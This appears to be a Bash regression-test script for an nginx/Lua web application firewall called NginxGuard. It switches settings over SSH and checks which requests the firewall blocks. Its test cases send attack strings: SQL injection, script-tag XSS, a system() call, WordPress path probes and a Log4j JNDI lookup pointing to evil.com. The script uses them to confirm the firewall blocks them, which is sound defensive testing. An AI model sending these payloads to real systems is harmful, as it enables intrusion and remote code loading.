#!/bin/bash
# NginxGuard 回归测试 — 补充现有测试脚本未覆盖的功能点
# 测试目标: 192.168.2.180 (NginxGuard on port 80)
# 覆盖: bodyless on/off 切换、域名级 bodyless、cc_rate 无效配置、
#        日志字段截断、PUT/PATCH 方法行为、POST 大 body 拦截

TARGET="http://192.168.2.180"
SSH180="ssh 192.168.2.180"
NGINX_CMD="cd /opt/nginx && ./nginx -p /opt/nginx/ -c conf/nginx.conf"
WAF_CONFIG="/opt/nginx/lua/waf/config.lua"
WAF_LOG_DIR="/opt/nginx/log"
RULE_CACHE_WAIT=12
PASS=0; FAIL=0; TOTAL=0; ERRORS=""
RESULTS="/tmp/waf_regression_test.txt"
> $RESULTS
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo "[$(date '+%H:%M:%S')] $*" | tee -a $RESULTS; }
ok()   { echo -e "  ${GREEN}PASS${NC}  $1  (HTTP $2)" | tee -a $RESULTS; PASS=$((PASS+1)); TOTAL=$((TOTAL+1)); }
bad()  { echo -e "  ${RED}FAIL${NC}  $1  (got $2, want $3)" | tee -a $RESULTS; FAIL=$((FAIL+1)); TOTAL=$((TOTAL+1)); ERRORS="$ERRORS\n  $1: got $2, want $3"; }

test_rule() {
    local name="$1"; local expect="$2"; shift 2
    local actual=$(curl --globoff -s -m 10 -o /dev/null -w "%{http_code}" "$@" 2>/dev/null)
    if [ "$actual" = "$expect" ]; then ok "$name" "$actual"; else bad "$name" "$actual" "$expect"; fi
}
set_config() { $SSH180 "sed -i \"s|^config_$1 = .*|config_$1 = \\\"$2\\\"|\" $WAF_CONFIG"; }
restart_nginx() { $SSH180 "kill -TERM \$(cat /opt/nginx/logs/nginx.pid) 2>/dev/null; sleep 1; cd /opt/nginx && ./nginx -p /opt/nginx/ -c conf/nginx.conf 2>&1"; sleep 2; }
reload_nginx() { $SSH180 "$NGINX_CMD -s reload 2>&1"; sleep 3; }

echo "========================================" | tee -a $RESULTS
echo "  NginxGuard 回归测试" | tee -a $RESULTS
echo "  目标: $TARGET" | tee -a $RESULTS
echo "  时间: $(date '+%Y-%m-%d %H:%M:%S')" | tee -a $RESULTS
echo "  补充: bodyless/cc_rate无效/日志截断/PUT方法/大body" | tee -a $RESULTS
echo "========================================" | tee -a $RESULTS

# 预处理: 重启 + 关闭 CC
restart_nginx
set_config "cc_check" "off"
sleep 3
$SSH180 "$NGINX_CMD -s reload 2>&1"
sleep 2

# ============================================================
# 1. bodyless=on (默认): GET/HEAD/OPTIONS 跳过 body/post/file_upload
# ============================================================
echo -e "\n${CYAN}=== 1. bodyless=on (默认): GET 跳过 body 检测 ===${NC}" | tee -a $RESULTS
set_config "bodyless" "on"
sleep 3
reload_nginx

# GET 请求不应被 post_check 拦截 (即使带攻击 payload 在 body 中)
# GET 请求一般没有 body, 但如果有也不扫描
test_rule "GET bodyless=on: 正常GET放行" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"
test_rule "GET bodyless=on: 正常args放行" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=123"
# GET 带 URL 参数攻击仍应拦截 (url_check 不受 bodyless 影响)
test_rule "GET bodyless=on: URL SQLi仍拦截" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+union+select+1"

# HEAD 方法
test_rule "HEAD bodyless=on: 正常HEAD放行" 200 -H "User-Agent: Mozilla/5.0" -X HEAD "$TARGET/"
test_rule "HEAD bodyless=on: URL SQLi仍拦截" 403 -H "User-Agent: Mozilla/5.0" -X HEAD "$TARGET/?id=1+union+select+1"

# OPTIONS 方法 (nginx 静态 root 返回 405)
test_rule "OPTIONS bodyless=on: 放行(405)" 405 -H "User-Agent: Mozilla/5.0" -X OPTIONS "$TARGET/"

# ============================================================
# 2. bodyless=off: GET/HEAD/OPTIONS 也扫描 body
# ============================================================
echo -e "\n${CYAN}=== 2. bodyless=off: 强制全方法扫描 body ===${NC}" | tee -a $RESULTS
set_config "bodyless" "off"
sleep 3
reload_nginx

# bodyless=off 后, GET 请求仍能正常放行 (GET 没有 body)
test_rule "GET bodyless=off: 正常GET放行" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"
# URL 攻击仍拦截
test_rule "GET bodyless=off: URL SQLi仍拦截" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+union+select+1"

# PUT 方法 + 攻击 body (PUT 不是 bodyless, 无论 bodyless 配置都扫描)
test_rule "PUT + SQL body 拦截" 403 -X PUT -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# PATCH 方法 + 攻击 body
test_rule "PATCH + SQL body 拦截" 403 -X PATCH -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# DELETE 方法 + 攻击 body
test_rule "DELETE + SQL body 拦截" 403 -X DELETE -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# POST 方法 (始终扫描)
test_rule "POST + SQL body 拦截" 403 -X POST -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# 恢复 bodyless=on
set_config "bodyless" "on"
sleep 3
reload_nginx

# ============================================================
# 3. bodyless 域名级覆盖 (strict.example.com: bodyless=off)
# ============================================================
echo -e "\n${CYAN}=== 3. 域名级 bodyless 覆盖 ===${NC}" | tee -a $RESULTS

# strict.example.com 在 domain.json 中设了 bodyless=off
# 该域名的请求应对所有方法扫描 body
# 全局 bodyless=on, 但 strict.example.com 覆盖为 off

# strict.example.com + PUT + SQL body 应拦截
test_rule "strict.example.com PUT+SQL body 拦截" 403 -X PUT -H "Host: strict.example.com" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# strict.example.com + PATCH + SQL body 应拦截
test_rule "strict.example.com PATCH+SQL body 拦截" 403 -X PATCH -H "Host: strict.example.com" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# 对比: 全局域名 PUT + SQL body 也应拦截 (PUT 本来就不是 bodyless)
test_rule "全局 PUT+SQL body 拦截" 403 -X PUT -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# ============================================================
# 4. cc_rate 无效配置: 应记录错误日志, CC 静默失效
# ============================================================
echo -e "\n${CYAN}=== 4. cc_rate 无效配置 ===${NC}" | tee -a $RESULTS

# 先清空 error.log 中的相关日志
$SSH180 "truncate -s 0 /opt/nginx/log/error.log 2>/dev/null || true"

set_config "cc_check" "on"
set_config "cc_rate" "invalid_rate"
sleep 3
reload_nginx

# 发送大量请求, 不应被 CC 拦截 (因为 cc_rate 无效, CC 检测静默失效)
CC_BLOCKED=0
for i in $(seq 1 30); do
    CODE=$(curl --globoff -s -m 3 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" "$TARGET/")
    [ "$CODE" = "403" ] && CC_BLOCKED=$((CC_BLOCKED+1))
done

if [ "$CC_BLOCKED" -eq 0 ]; then
    ok "无效cc_rate: CC静默失效(不拦截)" "0"
else
    bad "无效cc_rate: 仍有$CC_BLOCKED次拦截" "$CC_BLOCKED" "0"
fi

# 检查 error.log 中是否有错误日志
ERR_LOG=$($SSH180 "grep 'invalid cc_rate config' /opt/nginx/log/error.log 2>/dev/null | head -1")
if [ -n "$ERR_LOG" ]; then
    ok "无效cc_rate: error.log 记录了错误" "found"
else
    bad "无效cc_rate: error.log 未记录错误" "not found" "found"
fi

# 恢复 cc_rate
set_config "cc_rate" "150/60"
set_config "cc_check" "off"
sleep 3
reload_nginx

# ============================================================
# 5. 日志字段截断保护
# ============================================================
echo -e "\n${CYAN}=== 5. 日志字段截断保护 ===${NC}" | tee -a $RESULTS

# 确保有攻击日志 (先发一个攻击请求)
curl --globoff -s -m 5 -o /dev/null -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+union+select+1"

# 构造超长 URL 攻击 (超过 4096 字节)
LONG_PAYLOAD=$(python3 -c "print('a'*5000 + '+union+select')")
# 这个请求会被 URL 参数检测拦截 (包含 union select)
curl --globoff -s -m 10 -o /dev/null -H "User-Agent: Mozilla/5.0" "$TARGET/?id=${LONG_PAYLOAD}" 2>/dev/null

# 检查日志中 req_url 字段是否被截断
LOGFILE="$WAF_LOG_DIR/$(date +%Y-%m-%d)_waf.log"
TRUNC_CHECK=$($SSH180 "tail -1 $LOGFILE 2>/dev/null | python3 -c \"
import sys, json
line = sys.stdin.read().strip()
try:
    d = json.loads(line)
    url = d.get('req_url', '')
    if 'truncated' in url:
        print('truncated')
    elif len(url) > 5000:
        print('not_truncated')
    else:
        print('url_len=' + str(len(url)))
except:
    print('parse_error')
\"")

if [ "$TRUNC_CHECK" = "truncated" ]; then
    ok "日志截断: req_url 包含 truncated 标记" "$TRUNC_CHECK"
else
    # 可能是最后一条日志不是这个请求, 搜索最近几条
    TRUNC_CHECK2=$($SSH180 "grep 'truncated' $LOGFILE 2>/dev/null | tail -1 | head -c 20")
    if [ -n "$TRUNC_CHECK2" ]; then
        ok "日志截断: 找到 truncated 标记" "found"
    else
        bad "日志截断: 未找到 truncated 标记" "$TRUNC_CHECK" "truncated"
    fi
fi

# ============================================================
# 6. POST 大 body 超限拦截 (post_body_scan_limit)
# ============================================================
echo -e "\n${CYAN}=== 6. POST 大 body 超限拦截 ===${NC}" | tee -a $RESULTS

# 全局 post_body_scan_limit = 2097152 (2MB)
# 构造 2.5MB 的 JSON body, 应被拦截
python3 - <<'PY' >/tmp/nginxguard_large_body.json
import sys
payload = "a" * (2097152 + 1024)  # 2MB + 1KB
print('{"q":"' + payload + '"}')
PY

code=$(curl --globoff -s -m 15 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" --data-binary @/tmp/nginxguard_large_body.json "$TARGET/")
if [ "$code" = "403" ]; then
    ok "POST 大body超2MB被拦截(Deny_URL_POST_Oversize)" "$code"
else
    bad "POST 大body超2MB未拦截" "$code" "403"
fi

# 构造 1MB 的正常 JSON body, 不应被拦截 (未超限)
python3 - <<'PY' >/tmp/nginxguard_normal_body.json
payload = "a" * 1048576  # 1MB
print('{"q":"' + payload + '"}')
PY

code=$(curl --globoff -s -m 15 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" --data-binary @/tmp/nginxguard_normal_body.json "$TARGET/")
# nginx 静态 root 对 POST 返回 405, WAF 不拦截
if [ "$code" != "403" ]; then
    ok "POST 1MB body 未超限放行" "$code"
else
    bad "POST 1MB body 被误拦截" "$code" "non-403"
fi

# ============================================================
# 7. config_bodyless 动态切换 (不重启, 只 reload)
# ============================================================
echo -e "\n${CYAN}=== 7. bodyless 动态切换 ===${NC}" | tee -a $RESULTS

# bodyless=on → GET 放行 (没有 body)
set_config "bodyless" "on"
sleep 3
reload_nginx
test_rule "bodyless=on: GET放行" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"

# 切换为 off
set_config "bodyless" "off"
sleep 3
reload_nginx
test_rule "bodyless=off: GET放行(无body)" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"

# 切回 on
set_config "bodyless" "on"
sleep 3
reload_nginx
test_rule "bodyless恢复on: GET放行" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"

# ============================================================
# 8. POST JSON body 攻击 (补充)
# ============================================================
echo -e "\n${CYAN}=== 8. POST JSON body 攻击 ===${NC}" | tee -a $RESULTS
test_rule "JSON XSS script" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"q":"<script>alert(1)</script>"}' "$TARGET/"
test_rule "JSON SQL union" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"id":"1 union select 1"}' "$TARGET/"
test_rule "JSON system()" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"cmd":"system(\"ls\")"}' "$TARGET/"
test_rule "JSON Log4j" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"q":"${jndi:ldap://evil.com}"}' "$TARGET/"
test_rule "JSON SSTI" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"x":"{{__class__}}"}' "$TARGET/"

# ============================================================
# 8.1 三层组合规则 (combo.jsonl): CVE 虚拟补丁 / 动作 / 热加载
# ============================================================
echo -e "\n${CYAN}=== 8.1 三层组合规则 ===${NC}" | tee -a $RESULTS
test_rule "Combo: WP setup-config" 403 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/wp-admin/setup-config.php"
test_rule "Combo: WP upgrade php" 403 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/wp-content/upgrade/evil.php"
test_rule "Combo: WP upgrade 非php放行" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/wp-content/upgrade/evil.txt"
test_rule "Combo: Axis SOAP Fault" 403 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" -H "Content-Type: text/xml" --data '<?xml version="1.0"?><soap:Fault><soap:exceptionName>x</soap:exceptionName></soap:Fault>' "$TARGET/"
test_rule "Combo: phpAfterShell upload_progress" 403 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" -F "PHP_SESSION_UPLOAD_PROGRESS=abc" "$TARGET/"

COMBO_FILE="/opt/nginx/lua/waf/rule-config/combo.jsonl"
COMBO_BAK="/tmp/combo.regression.$$"
$SSH180 "cp $COMBO_FILE $COMBO_BAK; cat >> $COMBO_FILE <<'EOF'
{\"id\":\"tmp-log\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/logtest\"},\"action\":\"LOG\"}
{\"id\":\"tmp-score-a\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/scoretest\"},\"action\":\"SCORE\",\"score\":10}
{\"id\":\"tmp-score-b\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/scoretest\"},\"action\":\"SCORE\",\"score\":10}
{\"id\":\"tmp-badregex\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/badregex\"},{\"cond\":\"uri\",\"op\":\"re\",\"value\":\"[\"}],\"action\":\"BLOCK\"}
{\"id\":\"tmp-ci-re\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/CITEST\"},{\"cond\":\"args\",\"op\":\"re\",\"value\":\"secret=\"}],\"action\":\"LOG\"}
{\"id\":\"tmp-ci-contains\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/citest\"},{\"cond\":\"args\",\"op\":\"contains\",\"value\":\"evil\"}],\"action\":\"LOG\"}
{\"id\":\"tmp-ci-prefix\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/CIPREFIX\"},\"action\":\"LOG\"}
{\"id\":\"tmp-ci-eq\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/citest\"},{\"cond\":\"args\",\"op\":\"eq\",\"value\":\"A=1\"}],\"action\":\"LOG\"}
{\"id\":\"tmp-cs-re\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/citest\"},{\"cond\":\"args\",\"op\":\"re\",\"value\":\"secret=\",\"flags\":\"jo\"}],\"action\":\"LOG\"}
{\"id\":\"tmp-cs-contains\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/citest\"},{\"cond\":\"args\",\"op\":\"contains\",\"value\":\"evil\",\"icase\":false}],\"action\":\"LOG\"}
{\"id\":\"tmp-cs-prefix\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/CSPREFIX\",\"icase\":false},\"action\":\"LOG\"}
EOF"
sleep $RULE_CACHE_WAIT
test_rule "Combo: LOG 不拦截" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/logtest"
test_rule "Combo: SCORE 未达阈值不拦截" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/scoretest"
test_rule "Combo: 坏正则加载期丢弃" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/badregex"

LOGFILE="$WAF_LOG_DIR/$(date +%Y-%m-%d)_waf.log"
log_count() { $SSH180 "grep -c '\"rule_tag\":\"$1\"' $LOGFILE" 2>/dev/null || true; }

# 内联条件默认忽略大小写
CI_BEFORE=$(log_count tmp-ci-re)
test_rule "Combo: re 默认忽略大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/CITEST?SECRET=1"
CI_AFTER=$(log_count tmp-ci-re)
if [ "$CI_AFTER" -gt "$CI_BEFORE" ]; then ok "Combo: re 默认忽略大小写(命中)" "$CI_AFTER"; else bad "Combo: re 默认忽略大小写未命中" "$CI_AFTER" ">$CI_BEFORE"; fi

CI_BEFORE=$(log_count tmp-ci-contains)
test_rule "Combo: contains 默认忽略大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/citest?x=EVIL"
CI_AFTER=$(log_count tmp-ci-contains)
if [ "$CI_AFTER" -gt "$CI_BEFORE" ]; then ok "Combo: contains 默认忽略大小写(命中)" "$CI_AFTER"; else bad "Combo: contains 默认忽略大小写未命中" "$CI_AFTER" ">$CI_BEFORE"; fi

CI_BEFORE=$(log_count tmp-ci-prefix)
test_rule "Combo: prefix 默认忽略大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/ciprefix"
CI_AFTER=$(log_count tmp-ci-prefix)
if [ "$CI_AFTER" -gt "$CI_BEFORE" ]; then ok "Combo: prefix 默认忽略大小写(命中)" "$CI_AFTER"; else bad "Combo: prefix 默认忽略大小写未命中" "$CI_AFTER" ">$CI_BEFORE"; fi

CI_BEFORE=$(log_count tmp-ci-eq)
test_rule "Combo: eq(args) 默认忽略大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/citest?a=1"
CI_AFTER=$(log_count tmp-ci-eq)
if [ "$CI_AFTER" -gt "$CI_BEFORE" ]; then ok "Combo: eq(args) 默认忽略大小写(命中)" "$CI_AFTER"; else bad "Combo: eq(args) 默认忽略大小写未命中" "$CI_AFTER" ">$CI_BEFORE"; fi

# 显式关闭大小写忽略
CS_BEFORE=$(log_count tmp-cs-re)
test_rule "Combo: re flags=jo 区分大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/citest?SECRET=1"
CS_AFTER=$(log_count tmp-cs-re)
if [ "$CS_AFTER" = "$CS_BEFORE" ]; then ok "Combo: re flags=jo 区分大小写(未命中)" "$CS_AFTER"; else bad "Combo: re flags=jo 仍忽略大小写" "$CS_AFTER" "$CS_BEFORE"; fi

CS_BEFORE=$(log_count tmp-cs-contains)
test_rule "Combo: contains icase=false 区分大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/citest?x=EVIL"
CS_AFTER=$(log_count tmp-cs-contains)
if [ "$CS_AFTER" = "$CS_BEFORE" ]; then ok "Combo: contains icase=false 区分大小写(未命中)" "$CS_AFTER"; else bad "Combo: contains icase=false 仍忽略大小写" "$CS_AFTER" "$CS_BEFORE"; fi

CS_BEFORE=$(log_count tmp-cs-prefix)
test_rule "Combo: prefix icase=false 区分大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/csprefix"
CS_AFTER=$(log_count tmp-cs-prefix)
if [ "$CS_AFTER" = "$CS_BEFORE" ]; then ok "Combo: prefix icase=false 区分大小写(未命中)" "$CS_AFTER"; else bad "Combo: prefix icase=false 仍忽略大小写" "$CS_AFTER" "$CS_BEFORE"; fi

if $SSH180 "grep -q '\"rule_tag\":\"tmp-log\"' $LOGFILE" 2>/dev/null; then
    ok "Combo: LOG 日志已记录" "found"
else
    bad "Combo: LOG 日志缺失" "not found" "found"
fi
if $SSH180 "grep -q '\"rule_tag\":\"tmp-score-b\"' $LOGFILE" 2>/dev/null; then
    ok "Combo: SCORE 日志已记录" "found"
else
    bad "Combo: SCORE 日志缺失" "not found" "found"
fi
if $SSH180 "grep -q 'combo: invalid regex' /opt/nginx/log/error.log" 2>/dev/null; then
    ok "Combo: 坏正则错误日志已记录" "found"
else
    bad "Combo: 坏正则错误日志缺失" "not found" "found"
fi

$SSH180 "cp $COMBO_BAK $COMBO_FILE; rm -f $COMBO_BAK"
sleep $RULE_CACHE_WAIT
LOG_BEFORE=$($SSH180 "grep -c '\"rule_tag\":\"tmp-log\"' $LOGFILE" 2>/dev/null || true)
test_rule "Combo: 恢复规则文件" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/logtest"
LOG_AFTER=$($SSH180 "grep -c '\"rule_tag\":\"tmp-log\"' $LOGFILE" 2>/dev/null || true)
if [ "$LOG_BEFORE" = "$LOG_AFTER" ]; then
    ok "Combo: 临时规则已热加载移除" "same"
else
    bad "Combo: 临时规则仍生效" "$LOG_AFTER" "$LOG_BEFORE"
fi

# ============================================================
# 9. 正常请求不误报 (回归)
# ============================================================
echo -e "\n${CYAN}=== 9. 正常请求不误报 ===${NC}" | tee -a $RESULTS
test_rule "Normal: hello world" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=hello+world"
test_rule "Normal: page param" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?page=1&size=20"
test_rule "Normal: email format" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?email=test@example.com"
test_rule "Normal: date param" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?date=2026-08-20"
test_rule "Normal: search" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?search=hello+world+test"
test_rule "Normal: Chrome UA" 200 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0" "$TARGET/"
test_rule "Normal: Mobile UA" 200 -A "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)" "$TARGET/"

# ============================================================
# 10. cc_mode 计数粒度 (ip / ip_uri / ip_host)
#     基线: / => 200, 未知路径 => 404, 任意 Host => 200
# ============================================================
echo -e "\n${CYAN}=== 10. cc_mode 计数粒度 ===${NC}" | tee -a $RESULTS
set_config "cc_check" "on"
set_config "cc_rate" "10/60"
set_config "cc_block_ttl" "0"   # 关闭自动拉黑, 只观察计数行为
reload_nginx

# cc_burst <count> <path> [host] : 发 n 个请求, 输出最后一个状态码
cc_burst() {
    local n="$1" p="$2" h="$3" code=""
    for i in $(seq 1 "$n"); do
        if [ -n "$h" ]; then
            code=$(curl --globoff -s -m 3 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "Host: $h" "$TARGET$p")
        else
            code=$(curl --globoff -s -m 3 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" "$TARGET$p")
        fi
    done
    echo "$code"
}

# --- 10.1 cc_mode=ip (默认): 跨 URI 共享额度 ---
echo -e "${YELLOW}  --- 10.1 cc_mode=ip: 跨 URI 共享 ---${NC}" | tee -a $RESULTS
set_config "cc_mode" "ip"
restart_nginx
cc_burst 6 /ccm-a > /dev/null
cc_burst 6 /ccm-b > /dev/null
code=$(cc_burst 1 /ccm-a)
if [ "$code" = "403" ]; then ok "ip模式: 两个URI合计12次超过10/60触发" "$code"; else bad "ip模式跨URI共享" "$code" "403"; fi

# --- 10.2 cc_mode=ip_uri: URI 独立计数 ---
echo -e "${YELLOW}  --- 10.2 cc_mode=ip_uri: URI 独立 ---${NC}" | tee -a $RESULTS
set_config "cc_mode" "ip_uri"
restart_nginx
cc_burst 6 /ccm-a > /dev/null
code=$(cc_burst 6 /ccm-b)
if [ "$code" != "403" ]; then ok "ip_uri模式: 两个URI各6次不触发" "$code"; else bad "ip_uri模式URI独立" "$code" "非403"; fi
code=$(cc_burst 12 /ccm-c)
if [ "$code" = "403" ]; then ok "ip_uri模式: 单URI 12次超过10/60触发" "$code"; else bad "ip_uri模式单URI触发" "$code" "403"; fi

# --- 10.3 cc_mode=ip_host: 域名独立计数 + 封禁隔离 ---
echo -e "${YELLOW}  --- 10.3 cc_mode=ip_host: 域名独立 ---${NC}" | tee -a $RESULTS
set_config "cc_mode" "ip_host"
set_config "cc_block_ttl" "300"
restart_nginx
# 用非 index 路径: "/" 会内部跳转到 /index.html 触发两次 access 阶段
cc_burst 6 /ccm-h h1.ccmode.test > /dev/null
code=$(cc_burst 6 /ccm-h h2.ccmode.test)
if [ "$code" != "403" ]; then ok "ip_host模式: 两个域名各6次不触发" "$code"; else bad "ip_host模式域名独立" "$code" "非403"; fi
code=$(cc_burst 12 /ccm-h h1.ccmode.test)
if [ "$code" = "403" ]; then ok "ip_host模式: 单域名12次超过10/60触发" "$code"; else bad "ip_host模式单域名触发" "$code" "403"; fi
code=$(curl --globoff -s -m 3 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "Host: h2.ccmode.test" "$TARGET/ccm-h")
if [ "$code" != "403" ]; then ok "ip_host模式: h1被封后h2不受影响(封禁隔离)" "$code"; else bad "ip_host模式封禁隔离" "$code" "非403"; fi

# --- 恢复 cc_mode 相关配置 ---
set_config "cc_mode" "ip"
set_config "cc_rate" "150/60"
set_config "cc_block_ttl" "600"
restart_nginx
log "cc_mode 用例完成, 配置已恢复"

# ============================================================
# 后处理: 恢复配置
# ============================================================
echo -e "\n${CYAN}=== 后处理: 恢复配置 ===${NC}" | tee -a $RESULTS
set_config "cc_check" "on"
set_config "cc_rate" "150/60"
set_config "bodyless" "on"
restart_nginx
log "配置已恢复, nginx 已重启"

# 汇总
echo "" | tee -a $RESULTS
echo "========================================" | tee -a $RESULTS
echo "  回归测试汇总" | tee -a $RESULTS
echo "  PASS: $PASS  FAIL: $FAIL  TOTAL: $TOTAL" | tee -a $RESULTS
echo "  时间: $(date)" | tee -a $RESULTS
echo "========================================" | tee -a $RESULTS
if [ $FAIL -gt 0 ]; then
    echo -e "失败项:$ERRORS" | tee -a $RESULTS
fi
echo ""
echo "Results saved to $RESULTS"
